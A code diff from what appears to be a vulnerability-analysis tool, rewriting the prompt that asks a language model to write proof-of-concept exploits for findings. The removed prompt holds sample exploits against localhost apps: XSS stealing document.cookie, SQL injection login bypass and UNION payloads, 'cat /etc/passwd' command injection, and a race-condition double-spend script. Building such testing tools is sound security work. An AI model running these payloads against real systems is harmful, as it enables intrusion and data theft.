@@ -10,6 +10,7 @@ import { RLMExecutor } from './rlm/rlm-executor.js';
 import { RLMCostTracker } from './rlm/rlm-cost-tracker.js';
 import { RLMConfig, RLMActivation } from './rlm/rlm-types.js';
 import { ContentReplacer } from '../utils/content-replacement.js';
+import { selectPocExamples } from './poc-examples.js';
 
 export interface AgentTask {
   id?: string;
@@ -1673,354 +1674,64 @@ Return JSON only:
       }
     }
 
-    return `# CAREFULLY CRAFTED POC GENERATION TASK - RECURSIVE MODEL LANGUAGE (RML)
+    const deps = vulnerability.exploitationDependencies?.summary ||
+      (vulnerability.exploitationDependencies ? JSON.stringify(vulnerability.exploitationDependencies) : 'none specified');
+    const reachability = vulnerability.reachability || 'no conditions specified';
 
-**CONTEXT**: You are a security researcher with FULL code context creating a proof-of-concept for a vulnerability you discovered during authorized security testing.
+    const examples = selectPocExamples(vulnerability.type || '', 2);
+    const examplesSection = examples.length > 0
+      ? `## Examples\nThe following examples illustrate the expected output format:\n\n${examples.map(e =>
+          '```json\n' + JSON.stringify(e.example, null, 2) + '\n```'
+        ).join('\n\n')}\n`
+      : '';
 
-**RML ADVANTAGE**: You have access to the COMPLETE code context, recursive analysis, call chains, data flows, and vulnerability chains. Use this deep understanding to create a PRECISE, WORKING POC.
+    return `Generate a security test case for the following vulnerability.
 
-This POC will be used to:
-1. Demonstrate the vulnerability to the development team
-2. Verify the bug exists (anti-hallucination validation)
-3. Test the fix after remediation
-4. Document the issue for responsible disclosure
+The test case must be specific to the actual code — use exact function names,
+endpoints, parameters, and data types from the source. Do not use placeholder
+values.
 
-You are creating a REAL, WORKING proof-of-concept exploit. This requires EXTREME CARE and attention to detail leveraging ALL available context.
-
-## 🎯 CRITICAL: Read Everything Before Writing Code
-
-## Vulnerability Details (READ CAREFULLY)
+## Vulnerability
+\`\`\`json
 ${JSON.stringify(vulnerability, null, 2)}
-
-## Vulnerable Source Code (Lines around ${vulnerability.location.file}:${vulnerability.location.line})
-
-\`\`\`${targetLanguage || 'c'}
-${sourceCode || '// Source code not available - generate POC based on vulnerability description'}
 \`\`\`
 
-## Target Software Language
-${targetLanguage || 'auto-detect from vulnerability'}
-
-## MANDATORY ANALYSIS STEPS (Do NOT skip)
-
-### STEP 1: Deep Vulnerability Analysis (5 Whys + 5 Hows)
-
-**5 WHYS - Root Cause Analysis**:
-1. Why does this vulnerability exist?
-2. Why wasn't it caught during development?
-3. Why is this code path vulnerable but others aren't?
-4. Why does the attack vector work?
-5. Why can an attacker control the input?
-
-**5 HOWS - Exploitation Path**:
-1. How does attacker input reach the vulnerable code?
-2. How does the vulnerable code process that input?
-3. How does this lead to the security impact?
-4. How can we trigger this reliably?
-5. How do we prove the exploit worked?
-
-### STEP 2: Check ALL Exploitation Dependencies
-
-**From vulnerability.exploitationDependencies** (if present):
-- What prerequisites are required? (state, timing, memory layout, etc.)
-- How feasible is each dependency?
-- Can the POC satisfy these dependencies?
-- If dependencies are DIFFICULT or THEORETICAL, explain this in setup
-
-**Examples to check**:
-- Does array need to be sparse? → Include code to create sparse array
-- Does object need specific state? → Include state setup code
-- Is there a race window? → Include timing/threading code
-- API sequence required? → Call APIs in exact order
-- Memory layout needed? → Include heap/stack manipulation
-- Feature flag required? → Document how to enable it
-- Authentication needed? → Include auth token generation
-
-### STEP 3: Check Code Reachability
-
-**From vulnerability.reachability** (if present):
-- Is code currently reachable?
-- If NO, what conditions make it reachable?
-- Can POC satisfy those conditions?
-- If unreachable, explain in setup how to make it reachable
-
-**Examples**:
-- Behind feature flag? → setupInstructions must say "Enable FLAG_X in config.yaml"
-- Requires admin? → setupInstructions must say "Create admin user first"
-- Debug build only? → setupInstructions must say "Compile with -DDEBUG flag"
-- Dead code? → setupInstructions must explain code is unreachable
-
-### STEP 4: Understand the FULL Attack Chain
-
-**Trace data flow from start to finish**:
-1. Where does attacker input enter? (HTTP request, file upload, IPC message, etc.)
-2. How is it processed? (parsing, deserialization, validation, etc.)
-3. Where does it reach the vulnerability? (exact function, line number)
-4. What happens at the vulnerable point? (buffer overflow, injection, UAF, etc.)
-5. What is the final impact? (RCE, data theft, crash, privilege escalation, etc.)
-
-**Your POC must reproduce this EXACT chain**
-
-### STEP 5: Analyze the Vulnerable Code
-
-**Look at the actual code** (from context):
-- What are the EXACT function signatures?
-- What are the EXACT parameter names?
-- What are the EXACT data types?
-- What are the EXACT API endpoints/paths?
-- What are the EXACT error messages?
-- What are the EXACT variable names?
-
-**DO NOT use generic placeholders - use the ACTUAL identifiers from the code**
-
-### STEP 6: Choose the Right POC Format
-
-**Format selection rules**:
-- **HTML** → Browser vulnerabilities (XSS, CSRF, clickjacking, postMessage bugs, DOM clobbering)
-- **SQL** → Database injection (SQL injection, NoSQL injection)
-- **HTTP/curl** → Web API bugs (auth bypass, IDOR, injection, deserialization)
-- **JavaScript** → Node.js/web backend bugs (prototype pollution, XXE, SSRF)
-- **Python** → Python backend bugs (pickle deserialization, template injection, command injection)
-- **C/C++** → Memory safety bugs (buffer overflow, UAF, double-free, race conditions)
-- **Rust** → Unsafe Rust bugs (memory unsafety in unsafe blocks)
-- **Go** → Go backend bugs (race conditions, type confusion in reflect)
-- **Bash** → Command injection, script vulnerabilities
-
-### STEP 7: Write SPECIFIC, WORKING Code
-
-**NOT ALLOWED** (generic placeholders):
-\`\`\`javascript
-// ❌ BAD - Generic
-fetch('/api/endpoint', { body: maliciousPayload })
+## Source code context (${vulnerability.location?.file}:${vulnerability.location?.line})
+\`\`\`${targetLanguage || 'text'}
+${sourceCode || '// Source not available — generate test case from the vulnerability description above'}
 \`\`\`
 
-**REQUIRED** (actual specifics):
-\`\`\`javascript
-// ✅ GOOD - Specific to vulnerability
-fetch('/api/users/search', {
-  method: 'POST',
-  headers: { 'Content-Type': 'application/json' },
-  body: JSON.stringify({
-    query: "admin' OR '1'='1",  // Matches vulnerability.attackVector
-    filter: "active"
-  })
-})
-\`\`\`
-
-### STEP 8: Handle All Prerequisites
-
-**Setup Instructions must include**:
-1. How to install dependencies (exact versions if needed)
-2. How to configure the target application
-3. How to enable any feature flags
-4. How to create necessary accounts/permissions
-5. How to set environment variables
-6. How to compile code (if applicable)
-7. What the expected output is
-8. How to verify the exploit succeeded
-
-### STEP 9: Add Detailed Comments
-
-**Every POC must explain**:
-- What each section of code does
-- Why each step is necessary
-- What the expected result is at each step
-- How to verify the exploit worked
-- What to look for in the output
-
-### STEP 10: Test Mentally
-
-**Before returning, verify**:
-- Does this POC use the EXACT vulnerable code path?
-- Does this POC satisfy ALL exploitation dependencies?
-- Does this POC handle reachability conditions?
-- Would this POC actually work if run?
-- Are setup instructions complete and accurate?
-- Did I use generic placeholders anywhere? (if yes, FIX IT)
-
-## Output Format
-
-**BEFORE writing code, complete this analysis** (mental checklist - don't output this):
-- [ ] Read vulnerability details completely
-- [ ] Read code context completely
-- [ ] Checked exploitation dependencies
-- [ ] Checked reachability conditions
-- [ ] Traced full attack chain
-- [ ] Identified exact function names, parameters, endpoints
-- [ ] Chose appropriate POC format
-- [ ] Know how to satisfy all prerequisites
-- [ ] Know how to verify success
-
-**NOW** respond with ONLY a JSON object:
+## Output format
+Respond with ONLY a JSON object (no text before or after):
 \`\`\`json
 {
-  "language": "html|javascript|python|go|rust|c|cpp|bash|sql|http|curl|etc",
-  "code": "ACTUAL WORKING CODE HERE - NO GENERIC PLACEHOLDERS",
-  "setupInstructions": "DETAILED step-by-step setup:\n1. Install dependencies: <exact commands>\n2. Configure target: <exact config changes>\n3. Enable prerequisites: <exact steps>\n4. Run POC: <exact command>\n5. Verify success: <what to look for>",
-  "expectedImpact": "SPECIFIC impact with evidence (not 'may cause XSS' but 'alert(document.cookie) executes showing session token')",
+  "language": "html|javascript|python|go|rust|c|cpp|bash|sql|http|curl",
+  "code": "complete, runnable test case code",
+  "setupInstructions": "numbered steps an independent tester can follow to run this test",
+  "expectedImpact": "specific, observable outcome that confirms the vulnerability (not vague — e.g. 'alert(document.cookie) appears' not 'XSS may occur')",
   "testSteps": [
-    "Step 1: Exact action with expected result",
-    "Step 2: Exact action with expected result",
-    "Step 3: How to confirm exploit succeeded"
+    "action and expected result",
+    "action and expected result",
+    "how to confirm the test succeeded"
   ],
   "prerequisitesHandled": {
-    "exploitationDependencies": "How POC handles each dependency from vulnerability.exploitationDependencies",
-    "reachability": "How POC handles reachability conditions from vulnerability.reachability",
-    "attackChain": "Confirmation that POC reproduces exact attack chain from vulnerability.evidenceChain"
+    "exploitationDependencies": "how the test satisfies each required dependency",
+    "reachability": "how the test reaches the vulnerable code path",
+    "attackChain": "summary of data flow from attacker input to impact"
   },
   "validated": false
 }
 \`\`\`
 
-**CRITICAL REQUIREMENTS**:
-1. \`code\` field must use EXACT identifiers from the actual vulnerable code (function names, endpoints, parameters)
-2. \`setupInstructions\` must be complete enough that someone unfamiliar can run the POC
-3. \`expectedImpact\` must be specific and measurable (not vague)
-4. \`testSteps\` must provide concrete verification steps
-5. \`prerequisitesHandled\` must confirm all dependencies and reachability conditions are addressed
+## Guidelines
+- Trace data flow from attacker-controlled input to the vulnerable code path
+- Exploitation dependencies: ${deps}
+- Reachability conditions: ${reachability}
+- Use exact identifiers from the source: function names, endpoint paths, parameter names, types
+- Choose the language that matches the vulnerability type (HTML for browser bugs, Python/JS for web backends, C for memory-safety, Bash for command injection, etc.)
+- Setup instructions must be complete enough for a tester who has not seen the code before
 
-## Examples of Good POCs
-
-### Example 1: Browser XSS with State Dependency (HTML POC)
-\`\`\`json
-{
-  "language": "html",
-  "code": "<!DOCTYPE html>\\n<html>\\n<head><title>XSS POC - Requires Authenticated Session</title></head>\\n<body>\\n  <h1>XSS Proof of Concept</h1>\\n  <p>Status: <span id='status'>Checking...</span></p>\\n  <script>\\n    // STEP 1: Check if user is authenticated (exploitation dependency: must be logged in)\\n    fetch('http://localhost:3000/api/auth/check')\\n      .then(r => r.json())\\n      .then(auth => {\\n        if (!auth.authenticated) {\\n          document.getElementById('status').textContent = 'ERROR: You must be logged in first!';\\n          return;\\n        }\\n        document.getElementById('status').textContent = 'Authenticated. Triggering XSS...';\\n        \\n        // STEP 2: Trigger the vulnerability (exact endpoint from vulnerability.location.file)\\n        // Uses exact payload from vulnerability.attackVector\\n        fetch('http://localhost:3000/api/dashboard/search?query=<img src=x onerror=alert(document.cookie)>')\\n          .then(r => r.text())\\n          .then(html => {\\n            // Reflected XSS triggers here when innerHTML renders the response\\n            document.getElementById('result').innerHTML = html;\\n          });\\n      });\\n  </script>\\n  <div id=\\"result\\"></div>\\n</body>\\n</html>",
-  "setupInstructions": "1. Start target web app: npm start (runs on localhost:3000)\\n2. Create a user account: curl -X POST http://localhost:3000/api/register -d '{\"user\":\"test\",\"pass\":\"test123\"}'\\n3. Login in browser: http://localhost:3000/login (use test/test123)\\n4. Open this HTML file in the SAME browser (must have session cookie)\\n5. Check browser console and alerts",
-  "expectedImpact": "JavaScript alert() executes showing document.cookie containing session token (proves XSS works in authenticated context)",
-  "testSteps": [
-    "Verify alert() popup appears",
-    "Check alert shows 'sessionId=...' cookie value",
-    "Open browser DevTools → Network tab to see the XSS payload in request",
-    "Confirm the vulnerability is at /api/dashboard/search endpoint"
-  ],
-  "prerequisitesHandled": {
-    "exploitationDependencies": "POC checks authentication status first (Step 1). If not authenticated, shows error message. Setup instructions include creating account and logging in.",
-    "reachability": "Endpoint /api/dashboard/search is only reachable for authenticated users. POC handles this by requiring login before opening HTML file.",
-    "attackChain": "POC reproduces exact attack chain: 1) User authenticated → 2) User visits dashboard → 3) Search query contains XSS → 4) Response reflected without sanitization → 5) innerHTML triggers XSS"
-  },
-  "validated": false
-}
-\`\`\`
-
-### Example 2: Node.js SQL Injection
-\`\`\`json
-{
-  "language": "javascript",
-  "code": "const http = require('http');\\n\\nconst payload = \\"1' OR '1'='1\\";\\nconst options = {\\n  hostname: 'localhost',\\n  port: 3000,\\n  path: '/api/users?id=' + encodeURIComponent(payload),\\n  method: 'GET'\\n};\\n\\nhttp.request(options, (res) => {\\n  let data = '';\\n  res.on('data', chunk => data += chunk);\\n  res.on('end', () => console.log('Got all users:', data));\\n}).end();",
-  "setupInstructions": "1. Ensure target app is running on localhost:3000\\n2. Run: node poc.js",
-  "expectedImpact": "Returns all users from database instead of single user"
-}
-\`\`\`
-
-### Example 2: Python Command Injection
-\`\`\`json
-{
-  "language": "python",
-  "code": "import requests\\n\\npayload = {'filename': 'test.txt; cat /etc/passwd'}\\nresponse = requests.post('http://localhost:5000/upload', json=payload)\\nprint(response.text)  # Should contain /etc/passwd contents",
-  "setupInstructions": "1. pip install requests\\n2. Ensure Flask app running on port 5000\\n3. python3 poc.py",
-  "expectedImpact": "Executes arbitrary command and returns /etc/passwd contents"
-}
-\`\`\`
-
-### Example 3: C Buffer Overflow
-\`\`\`json
-{
-  "language": "c",
-  "code": "#include <stdio.h>\\n#include <string.h>\\n\\nint main() {\\n    char buffer[1000];\\n    memset(buffer, 'A', 999);\\n    buffer[999] = '\\\\0';\\n    \\n    // Call vulnerable function\\n    extern void parse_input(char*);\\n    parse_input(buffer);  // Overflows internal 64-byte buffer\\n    \\n    return 0;\\n}",
-  "setupInstructions": "1. Compile: gcc -o poc poc.c vulnerable_app.o\\n2. Run: ./poc\\n3. Should crash or show memory corruption",
-  "expectedImpact": "Buffer overflow in parse_input() function causes crash or code execution"
-}
-\`\`\`
-
-### Example 4: SQL Injection (SQL POC)
-\`\`\`json
-{
-  "language": "sql",
-  "code": "-- Exploit SQL injection in login form\\n-- Original query: SELECT * FROM users WHERE username='$input' AND password='$pass'\\n\\n-- Payload 1: Authentication bypass\\nSELECT * FROM users WHERE username='admin' -- ' AND password='anything';\\n\\n-- Payload 2: Data exfiltration\\nSELECT * FROM users WHERE username='' UNION SELECT table_name, column_name, NULL FROM information_schema.columns -- ' AND password='';\\n\\n-- Payload 3: Time-based blind\\nSELECT * FROM users WHERE username='admin' AND IF(LENGTH(password)>10, SLEEP(5), 0) -- ' AND password='';",
-  "setupInstructions": "1. Test via web form at http://localhost/login\\n2. Enter username: admin' -- \\n3. Enter any password\\n4. Or use curl: curl -X POST http://localhost/login -d \\"username=admin' --&password=anything\\"",
-  "expectedImpact": "Bypasses authentication, logs in as admin without password"
-}
-\`\`\`
-
-### Example 5: Race Condition (Python POC with Threading)
-\`\`\`json
-{
-  "language": "python",
-  "code": "import requests\\nimport threading\\nimport time\\n\\n# Vulnerability: TOCTOU in balance check\\n# File: payment_service.py:142 (from vulnerability.location)\\n# Race window: ~50ms between check and deduct (from vulnerability.exploitationDependencies)\\n\\nBASE_URL = 'http://localhost:5000'\\nTOKEN = 'your-session-token-here'  # Get this from login\\n\\ndef purchase_item(item_id):\\n    '''Attempt to purchase item - creates race condition'''\\n    headers = {'Authorization': f'Bearer {TOKEN}'}\\n    resp = requests.post(f'{BASE_URL}/api/purchase', \\n                        json={'itemId': item_id, 'quantity': 1},\\n                        headers=headers)\\n    return resp.json()\\n\\ndef exploit_race():\\n    '''\\n    Exploitation dependency: Must hit race window between:\\n    1. balance_check() at line 142\\n    2. balance_deduct() at line 156\\n    Window is approximately 50ms\\n    '''\\n    # Step 1: Set balance to exactly item price (e.g., \\$100)\\n    requests.post(f'{BASE_URL}/api/test/set-balance', \\n                 json={'balance': 100},\\n                 headers={'Authorization': f'Bearer {TOKEN}'})\\n    \\n    # Step 2: Launch concurrent purchase requests\\n    # Both will pass the balance check, but only first should succeed\\n    threads = []\\n    results = []\\n    \\n    def purchase_and_store(item_id):\\n        result = purchase_item(item_id)\\n        results.append(result)\\n    \\n    # Launch 10 concurrent requests to increase chance of hitting race window\\n    for i in range(10):\\n        t = threading.Thread(target=purchase_and_store, args=(123,))  # itemId=123, costs \\$100\\n        threads.append(t)\\n        t.start()\\n    \\n    # Wait for all to complete\\n    for t in threads:\\n        t.join()\\n    \\n    # Step 3: Check results\\n    successful = [r for r in results if r.get('success')]\\n    print(f'Successful purchases: {len(successful)} (should be 1, but is {len(successful)} due to race)')\\n    \\n    # Step 4: Check final balance (should be 0, but will be negative if race succeeded)\\n    balance_resp = requests.get(f'{BASE_URL}/api/balance', headers={'Authorization': f'Bearer {TOKEN}'})\\n    final_balance = balance_resp.json()['balance']\\n    print(f'Final balance: \${final_balance} (negative balance = race condition exploited!)')\\n    \\n    if final_balance < 0:\\n        print('✓ EXPLOIT SUCCESS: Multiple items purchased with insufficient funds')\\n        return True\\n    else:\\n        print('✗ Race not triggered, try again (timing-dependent)')\\n        return False\\n\\nif __name__ == '__main__':\\n    # Run exploit 5 times (race conditions are timing-dependent)\\n    for attempt in range(5):\\n        print(f'\\nAttempt {attempt + 1}/5')\\n        if exploit_race():\\n            break\\n        time.sleep(1)  # Wait before retry",
-  "setupInstructions": "1. Install dependencies: pip install requests\\n2. Start target app: python payment_service.py (runs on port 5000)\\n3. Create test account: curl -X POST http://localhost:5000/api/register -d '{\"username\":\"test\",\"password\":\"test123\"}'\\n4. Login and get token: curl -X POST http://localhost:5000/api/login -d '{\"username\":\"test\",\"password\":\"test123\"}' | jq -r '.token'\\n5. Edit POC: Replace 'your-session-token-here' with actual token\\n6. Run POC: python3 poc.py\\n7. Check output for negative balance (indicates successful race)",
-  "expectedImpact": "Race condition allows multiple purchases with single balance. Final balance becomes negative (e.g., -$900 after 10 purchases of $100 item with $100 initial balance). Demonstrates TOCTOU vulnerability in payment_service.py lines 142-156.",
-  "testSteps": [
-    "Run POC and observe 'Successful purchases' count (should be >1 if race triggered)",
-    "Check 'Final balance' value (should be negative if exploit worked)",
-    "Verify in app database: SELECT balance FROM users WHERE username='test' (should show negative value)",
-    "Check app logs for multiple concurrent 'Purchase approved' messages with same balance"
-  ],
-  "prerequisitesHandled": {
-    "exploitationDependencies": "Dependency: Timing window ~50ms. POC handles this by launching 10 concurrent threads to maximize probability of hitting race window. Includes retry logic (5 attempts) since timing is non-deterministic.",
-    "reachability": "Endpoint /api/purchase requires authentication. POC setup includes account creation, login, and token extraction steps.",
-    "attackChain": "POC reproduces exact attack chain: 1) balance=100 → 2) Thread A checks balance (pass) → 3) Thread B checks balance (pass, race window!) → 4) Thread A deducts → 5) Thread B deducts → 6) balance=-100 (double-spend)"
-  },
-  "validated": false
-}
-\`\`\`
-
-### Example 6: Data Structure Dependency (JavaScript - Sparse Array)
-\`\`\`json
-{
-  "language": "javascript",
-  "code": "// Vulnerability: Array.prototype.map assumes dense array, but sparse array causes undefined behavior\\n// File: arrayUtils.js:67 (from vulnerability.location)\\n// Dependency: Array must be sparse (from vulnerability.exploitationDependencies)\\n\\nconst http = require('http');\\n\\n// STEP 1: Create payload with sparse array (exploitation dependency)\\n// Sparse array has 'holes' - indices that don't exist\\nconst sparseArray = [];\\nsparseArray[0] = 'safe';\\nsparseArray[100] = '<img src=x onerror=alert(1)>';  // Gap from 1-99 (sparse!)\\n// sparseArray.length is 101, but only indices 0 and 100 have values\\n\\n// STEP 2: Serialize sparse array for transport\\n// JSON.stringify preserves sparseness by using null for holes\\nconst payload = JSON.stringify({\\n  items: sparseArray,  // Sparse array with XSS at index 100\\n  operation: 'transform'\\n});\\n\\n// STEP 3: Send to vulnerable endpoint\\nconst options = {\\n  hostname: 'localhost',\\n  port: 3000,\\n  path: '/api/array/process',  // Exact endpoint from vulnerability.location.file\\n  method: 'POST',\\n  headers: {\\n    'Content-Type': 'application/json',\\n    'Content-Length': payload.length\\n  }\\n};\\n\\nconst req = http.request(options, (res) => {\\n  let data = '';\\n  res.on('data', (chunk) => data += chunk);\\n  res.on('end', () => {\\n    console.log('Response:', data);\\n    // Vulnerable code at arrayUtils.js:67 does:\\n    // items.map(sanitize) but doesn't handle sparse array holes\\n    // Hole at index 99 becomes undefined → sanitize(undefined) → bypasses XSS filter\\n    // XSS payload at index 100 gets reflected unsanitized\\n    \\n    if (data.includes('<img src=x')) {\\n      console.log('✓ EXPLOIT SUCCESS: XSS payload reflected (sparse array bypassed sanitization)');\\n    }\\n  });\\n});\\n\\nreq.on('error', (e) => console.error('Error:', e.message));\\nreq.write(payload);\\nreq.end();",
-  "setupInstructions": "1. Ensure target Node.js app is running: npm start (port 3000)\\n2. Verify vulnerable endpoint exists: curl http://localhost:3000/api/array/process\\n3. Run POC: node poc.js\\n4. Check response contains unsanitized XSS payload\\n5. EXPLANATION: Sparse arrays have 'holes' where indices don't exist. The vulnerable map() at arrayUtils.js:67 assumes dense array, so sanitize() receives undefined for holes, which bypasses XSS filtering.",
-  "expectedImpact": "XSS payload '<img src=x onerror=alert(1)>' appears in response without sanitization. Demonstrates that sparse array structure bypasses the sanitization logic at arrayUtils.js:67 because map() over sparse array produces undefined values that aren't properly sanitized.",
-  "testSteps": [
-    "Check response contains '<img src=x onerror=alert(1)>' literally",
-    "Verify response does NOT contain '&lt;img' (sanitized version)",
-    "Test with dense array: [\"safe\", \"<img...>\"] → should be sanitized (proves sparseness is required)",
-    "Check server logs show 'Processing array with 101 items' (confirms length is preserved)"
-  ],
-  "prerequisitesHandled": {
-    "exploitationDependencies": "Dependency: Array must be sparse. POC explicitly creates sparse array with gap from index 1-99. Includes detailed comment explaining what sparse arrays are and why they're needed for this exploit.",
-    "reachability": "Endpoint /api/array/process is publicly accessible (no auth required based on vulnerability analysis).",
-    "attackChain": "POC reproduces: 1) Client sends sparse array → 2) Server receives at /api/array/process → 3) arrayUtils.js:67 calls items.map(sanitize) → 4) Sparse holes become undefined → 5) sanitize(undefined) returns undefined → 6) XSS payload bypasses filter"
-  },
-  "validated": false
-}
-\`\`\`
-
-### Example 7: Feature Flag Dependency (Unreachable Code)
-\`\`\`json
-{
-  "language": "bash",
-  "code": "#!/bin/bash\\n# Vulnerability: Command injection in experimental feature\\n# File: experimental_handler.go:234\\n# Reachability: Behind feature flag ENABLE_EXPERIMENTAL (disabled by default)\\n\\necho '========================================='\\necho 'POC for Command Injection in Experimental Feature'\\necho '========================================='\\necho ''\\n\\n# STEP 1: Check if feature is enabled (reachability condition)\\necho '[1/4] Checking if experimental feature is enabled...'\\ncurl -s http://localhost:8080/api/features | jq -r '.experimental'\\n\\nif [ \\"$(curl -s http://localhost:8080/api/features | jq -r '.experimental')\\" = \\"false\\" ]; then\\n  echo ''\\n  echo '❌ Feature is DISABLED. Vulnerability is not reachable.'\\n  echo ''\\n  echo 'To make this code reachable:'\\n  echo '1. Edit config/features.yaml'\\n  echo '2. Set ENABLE_EXPERIMENTAL: true'\\n  echo '3. Restart the application: ./app restart'\\n  echo ''\\n  echo 'This is a LATENT BUG - exists but unreachable currently.'\\n  exit 1\\nfi\\n\\necho '✓ Feature is enabled. Proceeding with exploit...'\\necho ''\\n\\n# STEP 2: Trigger the vulnerability\\necho '[2/4] Sending malicious payload to experimental endpoint...'\\nPAYLOAD='filename=test.txt; cat /etc/passwd'  # Command injection payload\\n\\nRESPONSE=$(curl -s -X POST http://localhost:8080/api/experimental/process \\\\\\n  -H 'Content-Type: application/x-www-form-urlencoded' \\\\\\n  -d \\"$PAYLOAD\\")\\n\\necho \\"Response length: $(echo \\"$RESPONSE\\" | wc -c) bytes\\"\\necho ''\\n\\n# STEP 3: Verify exploitation\\necho '[3/4] Checking if /etc/passwd was leaked...'\\nif echo \\"$RESPONSE\\" | grep -q 'root:x:0:0'; then\\n  echo '✓ EXPLOIT SUCCESS: /etc/passwd contents leaked'\\n  echo ''\\n  echo 'First few lines of /etc/passwd:'\\n  echo \\"$RESPONSE\\" | head -5\\nelse\\n  echo '✗ Exploit failed - command injection did not execute'\\nfi\\n\\necho ''\\necho '[4/4] Confirming vulnerability location...'\\necho 'Vulnerable code: experimental_handler.go:234'\\necho 'Function: processExperimentalFile()'\\necho 'Issue: User input passed directly to exec.Command() without sanitization'",
-  "setupInstructions": "1. Start application: ./app start\\n2. IMPORTANT: Enable experimental feature:\\n   - Edit config/features.yaml\\n   - Set: ENABLE_EXPERIMENTAL: true\\n   - Restart: ./app restart\\n3. Verify feature is enabled: curl http://localhost:8080/api/features | jq '.experimental'\\n4. Run POC: chmod +x poc.sh && ./poc.sh\\n5. POC will fail with error if feature is disabled (demonstrating unreachability)\\n\\nNOTE: This is a latent bug. Code exists but is unreachable in default configuration. Should be fixed before feature is released.",
-  "expectedImpact": "If feature flag is enabled: Command injection executes 'cat /etc/passwd', response contains /etc/passwd contents (user list). If disabled: POC exits with message explaining code is unreachable. Demonstrates latent vulnerability in experimental_handler.go:234.",
-  "testSteps": [
-    "First run with feature DISABLED → POC should exit with 'Feature is DISABLED' message",
-    "Enable feature flag in config/features.yaml",
-    "Restart application",
-    "Run POC again → Should show /etc/passwd contents",
-    "Verify response contains 'root:x:0:0:root:/root:/bin/bash'"
-  ],
-  "prerequisitesHandled": {
-    "exploitationDependencies": "No complex dependencies - straightforward command injection once code is reachable.",
-    "reachability": "Code is UNREACHABLE by default (behind ENABLE_EXPERIMENTAL flag). POC includes:\n1. Automatic check if feature is enabled\n2. Clear error message if unreachable\n3. Instructions on how to enable feature\n4. Explicit note that this is a latent bug\nSetup instructions detail the exact steps to make code reachable.",
-    "attackChain": "POC reproduces: 1) Feature flag enabled → 2) POST to /api/experimental/process → 3) experimental_handler.go:234 receives filename param → 4) Passed to exec.Command() without sanitization → 5) Shell interprets semicolon → 6) 'cat /etc/passwd' executes → 7) Output returned in response"
-  },
-  "validated": false
-}
-\`\`\`
-
----
-
-Now generate a POC for the vulnerability above. Make it REAL, SPECIFIC, and CAREFULLY CRAFTED following all 10 analysis steps.
-
-**IMPORTANT OUTPUT FORMAT REMINDER**:
-- You MUST respond with ONLY a JSON object (no explanatory text before or after)
-- Start your response with \`{\` and end with \`}\`
-- Include ALL required fields: language, code, setupInstructions, expectedImpact, testSteps, prerequisitesHandled
-- The JSON must be valid and parseable
-- You can wrap it in \`\`\`json code fence if you prefer, but the JSON itself must be complete and valid
-`;
+${examplesSection}`;
   }
 
   private buildPatternExtractionPrompt(input: any): string {
